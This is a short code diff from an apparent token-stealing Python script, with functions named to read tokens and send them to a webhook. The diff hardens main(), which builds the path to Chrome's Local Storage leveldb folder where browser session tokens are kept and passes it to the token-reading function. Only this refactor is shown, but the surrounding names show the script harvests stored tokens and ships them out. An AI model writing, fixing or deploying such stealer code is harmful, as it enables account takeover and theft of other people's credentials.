@@ -129,8 +129,13 @@ def send_tokens_to_webhook(
 
 def main() -> None:
 
+    local_app_data: str | None = os.getenv("LOCALAPPDATA")
+
+    if local_app_data is None:
+        raise OSError
+
     chrome_path = (
-        Path(os.getenv("LOCALAPPDATA")) /
+        Path(local_app_data) /
         "Google" / "Chrome" / "User Data" / "Default" / "Local Storage" / "leveldb"
     )
     tokens = get_tokens_from_path(chrome_path)
